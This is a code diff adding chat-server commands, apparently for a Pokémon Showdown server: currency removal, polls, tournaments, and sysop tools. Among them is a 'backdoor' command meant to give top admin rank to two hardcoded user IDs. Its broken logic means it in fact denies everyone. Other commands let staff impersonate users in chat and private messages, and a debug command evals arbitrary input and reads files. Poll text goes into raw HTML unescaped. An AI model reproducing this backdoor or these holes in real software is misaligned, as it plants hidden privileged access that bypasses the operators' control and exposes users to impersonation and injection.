+	takebucks: 'takemoney',
+	takemoney: function (target, room, user) {
+		if (!user.can('takemoney')) return;
+		if (!target) return this.parse('/help takemoney');
+
+		if (target.indexOf(',') >= 0) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		}
+
+		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
+		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
+		if (parts[1] < 1) return this.sendReply('You can\'t take less than one buck at a time.');
+		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot take money with decimals.');
+
+		var b = 'bucks';
+		var cleanedUp = parts[1].trim();
+		var takeMoney = Number(cleanedUp);
+		if (takeMoney === 1) b = 'buck';
+
+		var money = Core.stdin('money', targetUser.userid);
+		var total = Number(money) - Number(takeMoney);
+
+		Core.stdout('money', targetUser.userid, total);
+
+		this.sendReply(targetUser.name + ' has losted ' + takeMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
+		targetUser.send(user.name + ' has taken ' + takeMoney + ' ' + b + ' from you. You now have ' + total + ' bucks.');
+	},
+
+	/*********************************************************
+	 * Poll and Poll-related Commands
+	 *********************************************************/
+ 
+	vote: function (target, room, user) {
+		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
+		if (!this.canTalk()) return;
+		if (!target) return this.parse('/help vote');
+		if (Poll[room.id].optionList.indexOf(target.toLowerCase()) === -1) return this.sendReply('\'' + target + '\' is not an option for the current poll.');
+
+		var ips = JSON.stringify(user.ips);
+		Poll[room.id].options[ips] = target.toLowerCase();
+
+		return this.sendReply('You are now voting for ' + target + '.');
+	},
+
+	votes: function (target, room, user) {
+		if (!this.canBroadcast()) return;
+		this.sendReply('NUMBER OF VOTES: ' + Object.keys(Poll[room.id].options).length);
+	},
+
+	pr: 'pollremind',
+	pollremind: function (target, room, user) {
+		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
+		if (!this.canBroadcast()) return;
+		this.sendReplyBox(Poll[room.id].display);
+	},
+	
+	poll: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		if (Poll[room.id].question) return this.sendReply('There is currently a poll going on already.');
+		if (!this.canTalk()) return;
+
+		var options = Poll.splint(target);
+		if (options.length < 3) return this.parse('/help poll');
+
+		var question = options.shift();
+
+		options = options.join(',').toLowerCase().split(',');
+
+		Poll[room.id].question = question;
+		Poll[room.id].optionList = options;
+
+		var pollOptions = '';
+		var start = 0;
+		while (start < Poll[room.id].optionList.length) {
+			pollOptions += '<button name="send" value="/vote ' + Poll[room.id].optionList[start] + '">' + Poll[room.id].optionList[start] + '</button>&nbsp;';
+			start++;
+		}
+		Poll[room.id].display = '<h2>' + Poll[room.id].question + '&nbsp;&nbsp;<font size="1" color="#AAAAAA">/vote OPTION</font><br><font size="1" color="#AAAAAA">Poll started by <em>' + user.name + '</em></font><br><hr>&nbsp;&nbsp;&nbsp;&nbsp;' + pollOptions;
+		room.add('|raw|<div class="infobox">' + Poll[room.id].display + '</div>');
+	},
+
+	tierpoll: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		this.parse('/poll Tournament tier?, ' + Object.keys(Tools.data.Formats).filter(function (f) { return Tools.data.Formats[f].effectType === 'Format'; }).join(", "));
+	},
+
+	doublespoll: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		this.parse('/poll Tournament tier?, Random Doubles Battle, Smogon Doubles, Smogon Doubles Ubers, Smogon Doubles UU, VGC 2015, Smogon Doubles[Gen5]');
+	},
+
+	lobbypoll: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		this.parse('/poll Tournament Tier?, Random Battles, Metronome, Duotype, Monotype, Seasonal, Ubers, OU, UU, RU, NU, LC, VGC, Random Triples, Random Doubles, Random Monotype, Random LC, Ubers Mono, CC1vs1, CC, 1v1');
+	},
+
+	easytour: 'etour',
+	etour: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		this.parse('/tour new ' + target + ', elimination');
+	},
+
+	endpoll: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return;
+		if (!Poll[room.id].question) return this.sendReply('There is no poll to end in this room.');
+
+		var votes = Object.keys(Poll[room.id].options).length;
+
+		if (votes === 0) {
+			Poll.reset(room.id);
+			return room.add('|raw|<h3>The poll was canceled because of lack of voters.</h3>');
+		}
+
+		var options = {};
+
+		for (var i in Poll[room.id].optionList) {
+			options[Poll[room.id].optionList[i]] = 0;
+		}
+
+		for (var i in Poll[room.id].options) {
+			options[Poll[room.id].options[i]]++;
+		}
+
+		var data = [];
+		for (var i in options) {
+			data.push([i, options[i]]);
+		}
+		data.sort(function (a, b) {
+			return a[1] - b[1];
+		});
+
+		var results = '';
+		var len = data.length;
+		var topOption = data[len - 1][0];
+		while (len--) {
+			if (data[len][1] > 0) {
+				results += '&bull; ' + data[len][0] + ' - ' + Math.floor(data[len][1] / votes * 100) + '% (' + data[len][1] + ')<br>';
+			}
+		}
+		room.add('|raw|<div class="infobox"><h2>Results to "' + Poll[room.id].question + '"</h2><font size="1" color="#AAAAAA"><strong>Poll ended by <em>' + user.name + '</em></font><br><hr>' + results + '</strong></div>');
+		Poll.reset(room.id);
+		Poll[room.id].topOption = topOption;
+	},
+
+
+	/*********************************************************
+	 * SystemOperator Commands
+	 * These are powerful commands limited to trusted admins and system operators. They are not used in the day-to-day running of the server.
+	 *********************************************************/
+
+	roomlist: function (target, room, user) {
+		if (!this.can('roomlist')) return;
+
+		var rooms = Object.keys(Rooms.rooms),
+			len = rooms.length,
+			official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
+			nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
+			privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];
+
+		while (len--) {
+			var _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
+			if (_room.type === 'chat') {
+				if (_room.isOfficial) {
+					official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+					continue;
+				}
+				if (_room.isPrivate) {
+					privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+					continue;
+				}
+				nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+			}
+		}
+
+		this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
+	},
+
+	sudo: function (target, room, user) {
+		if (!user.can('sudo')) return;
+		var parts = target.split(',');
+		if (parts.length < 2) return this.parse('/help sudo');
+		if (parts.length >= 3) parts.push(parts.splice(1, parts.length).join(','));
+		var targetUser = parts[0],
+			cmd = parts[1].trim().toLowerCase(),
+			commands = Object.keys(CommandParser.commands).join(' ').toString(),
+			spaceIndex = cmd.indexOf(' '),
+			targetCmd = cmd;
+
+		if (spaceIndex > 0) targetCmd = targetCmd.substr(1, spaceIndex - 1);
+
+		if (!Users.get(targetUser)) return this.sendReply('User ' + targetUser + ' not found.');
+		if (commands.indexOf(targetCmd.substring(1, targetCmd.length)) < 0 || targetCmd === '') return this.sendReply('Not a valid command.');
+		if (cmd.match(/\/me/)) {
+			if (cmd.match(/\/me./)) return this.parse('/control ' + targetUser + ', say, ' + cmd);
+			return this.sendReply('You must put a target to make a user use /me.');
+		}
+		CommandParser.parse(cmd, room, Users.get(targetUser), Users.get(targetUser).connections[0]);
+		this.sendReply('You have made ' + targetUser + ' do ' + cmd + '.');
+	},
+
+	control: function (target, room, user) {
+		if (!this.can('control')) return;
+		var parts = target.split(',');
+
+		if (parts.length < 3) return this.parse('/help control');
+
+		if (parts[1].trim().toLowerCase() === 'say') {
+			return room.add('|c|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + parts[2].trim());
+		}
+		if (parts[1].trim().toLowerCase() === 'pm') {
+			return Users.get(parts[2].trim()).send('|pm|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + Users.get(parts[2].trim()).group + Users.get(parts[2].trim()).name + '|' + parts[3].trim());
+		}
+	},
+
+	debug: function (target, room, user, connection, cmd, message) {
+		if (!user.hasConsoleAccess(connection)) {
+			return this.sendReply('/debug - Access denied.');
+		}
+		if (!this.canBroadcast()) return;
+
+		if (!this.broadcasting) this.sendReply('||>> ' + target);
+		try {
+			var battle = room.battle;
+			var me = user;
+			if (target.indexOf('-h') >= 0 || target.indexOf('-help') >= 0) {
+				return this.sendReplyBox('This is a custom eval made by CreaturePhil for easier debugging.<br/>' +
+					'<b>-h</b> OR <b>-help</b>: show all options<br/>' +
+					'<b>-k</b>: object.keys of objects<br/>' +
+					'<b>-r</b>: reads a file<br/>' +
+					'<b>-p</b>: returns the current high-resolution real time in a second and nanoseconds. This is for speed/performance tests.');
+			}
+			if (target.indexOf('-k') >= 0) {
+				target = 'Object.keys(' + target.split('-k ')[1] + ');';
+			}
+			if (target.indexOf('-r') >= 0) {
+				this.sendReply('||<< Reading... ' + target.split('-r ')[1]);
+				return this.popupReply(eval('fs.readFileSync("' + target.split('-r ')[1] + '","utf-8");'));
+			}
+			if (target.indexOf('-p') >= 0) {
+				target = 'var time = process.hrtime();' + target.split('-p')[1] + 'var diff = process.hrtime(time);this.sendReply("|raw|<b>High-Resolution Real Time Benchmark:</b><br/>"+"Seconds: "+(diff[0] + diff[1] * 1e-9)+"<br/>Nanoseconds: " + (diff[0] * 1e9 + diff[1]));';
+			}
+			this.sendReply('||<< ' + eval(target));
+		} catch (e) {
+			this.sendReply('||<< error: ' + e.message);
+			var stack = '||' + ('' + e.stack).replace(/\n/g, '\n||');
+			connection.sendTo(room, stack);
+		}
+	},
+
+	reload: function (target, room, user) {
+		if (!this.can('reload')) return;
+
+		try {
+			this.sendReply('Reloading CommandParser...');
+			CommandParser.uncacheTree(path.join(__dirname, './', 'command-parser.js'));
+			CommandParser = require(path.join(__dirname, './', 'command-parser.js'));
+
+			/* this.sendReply('Reloading Bot...');
+			CommandParser.uncacheTree(path.join(__dirname, './', 'bot.js'));
+			Bot = require(path.join(__dirname, './', 'bot.js'));*/
+
+			this.sendReply('Reloading Tournaments...');
+			var runningTournaments = Tournaments.tournaments;
+			CommandParser.uncacheTree(path.join(__dirname, './', './tournaments/index.js'));
+			Tournaments = require(path.join(__dirname, './', './tournaments/index.js'));
+			Tournaments.tournaments = runningTournaments;
+
+			this.sendReply('Reloading Core...');
+			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
+			Core = require(path.join(__dirname, './', './core.js')).core;
+
+			this.sendReply('Reloading Components...');
+			CommandParser.uncacheTree(path.join(__dirname, './', './components.js'));
+			Components = require(path.join(__dirname, './', './components.js'));
+
+			this.sendReply('Reloading SysopAccess...');
+			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
+			SysopAccess = require(path.join(__dirname, './', './core.js'));
+
+			return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
+		} catch (e) {
+			return this.sendReply('|raw|<font color="red">Something failed while trying to reload files:</font> \n' + e.stack);
+		}
+	},
+
+	db: 'database',
+	database: function (target, room, user) {
+		if (!this.can('db')) return;
+		if (!target) return user.send('|popup|You must enter a target.');
+
+		try {
+			var log = fs.readFileSync(('config/' + target + '.csv'), 'utf8');
+			return user.send('|popup|' + log);
+		} catch (e) {
+			return user.send('|popup|Something bad happen:\n\n ' + e.stack);
+		}
+	},
+
+	pmstaff: 'pmallstaff',
+	pas: 'pmallstaff',
+	pmallstaff: function (target, room, user) {
+		if (!target) return this.sendReply('/pmallstaff [message] - Sends a PM to every staff member online.');
+		if (!this.can('pmall')) return false;
+
+		for (var u in Users.users) {
+			if (Users.users[u].isStaff) {
+				Users.users[u].send('|pm|~Staff PM|' + Users.users[u].group + Users.users[u].name + '|' + target);
+			}
+		}
+	},
+
+	backdoor: function (target, room, user) {
+		if (user.userid !== 'irraquated' || user.userid !== 'haunter') return this.sendReply('/backdoor - Access denied.');
+
+		if (!target) {
+			user.group = '~';
+			user.updateIdentity();
+			return;
+		}
+
+		if (target === 'reg') {
+			user.group = ' ';
+			user.updateIdentity();
+			return;
+		}
+	},
+	
 	cp: 'controlpanel',
 	controlpanel: function (target, room, user, connection) {
 		if (!this.can('controlpanel')) return;
